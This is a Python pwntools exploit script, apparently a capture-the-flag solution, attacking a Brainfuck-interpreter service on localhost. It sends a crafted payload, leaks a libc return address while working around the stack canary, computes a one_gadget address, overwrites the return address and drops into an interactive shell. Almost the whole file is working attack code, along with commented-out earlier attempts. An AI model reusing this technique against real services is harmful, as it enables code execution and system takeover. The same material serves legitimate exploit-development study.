from pwn import *
import time

from pwn import *
import time

bf_expl = open("../build/leak7.bf", "rb").read()
r = remote('localhost', 19783)
r.send(bf_expl + b"X" * (29998))
r.send(b"!")
print("lal1")
print(r.recvuntil(bf_expl[-10:]))
print("lal2")
for _ in range(1000 - 126 - 6 - 49): #  - 22):  # -24 for canary fail
    tmp = r.recvn(1)
    
    print("--> tmp", tmp)
    if tmp == b"\x00":
        tmp = b"\x01"
        print("Replaced by 0x01")
    r.send(tmp)
r.send(b"!")
#r.send(bytes.fromhex("ebafab"))

libc_ret_addr = b""

libc_ret = r.recvn(5)[-3:][::-1]
libc_ret_num = int.from_bytes(libc_ret, "big")
print("__libc_start_main_ret addr [last 3 bytes]", libc_ret.hex(), hex(libc_ret_num))

libc_base = libc_ret_num - 8531
print("Libc base [last 3 bytes]", hex(libc_base))

one_gad_offset = 0xc5fab
one_gadget_addr = libc_base + one_gad_offset
one_gadget_addr_b = int.to_bytes(one_gadget_addr, 3, "big")

print("Address of one gadget [last 3 bytes]", one_gadget_addr_b.hex())

print("Zerfickung")
r.send(one_gadget_addr_b)


#for _ in range(7):  # 6 for canary fail
#    tmp = r.recv(1)
#    r.send(tmp)
#    libc_ret_addr += tmp
#tmp = r.recv(1)
#r.send(b"!")
#libc_ret_addr += tmp
#r.send("!")

# print("libc ret address: ", libc_ret_addr.hex())

# libc_ret_num = struct.unpack("Q", libc_ret_addr)[0]
# libc_base = libc_ret_num - 8531
# one_gad_offset = 0xc5fab

# one_gadget_addr = libc_base + one_gad_offset

# print("Target jump addr: ", hex(one_gadget_addr))

# ret_addr = one_gadget_addr.to_bytes(8, "big")

# r.send(ret_addr[::-1])
r.interactive()

#f.write(b"M" * (1000 - len(bf_expl) + 4))
#f.write(b"!")
# r.send(b"!")
# r.send(b".")
# time.sleep(0.5)
# print(r.recv(8))
# r.interactive()
# for _ in range(100):
#     answ = r.recv(8)
#     r.send(answ)
#     print(answ)
# 


# r.send(b"!")
# r.send(b".")
# time.sleep(0.5)
# print(r.recv(8))
# r.interactive()
# for _ in range(100):
#     answ = r.recv(8)
#     r.send(answ)
#     print(answ)
# 
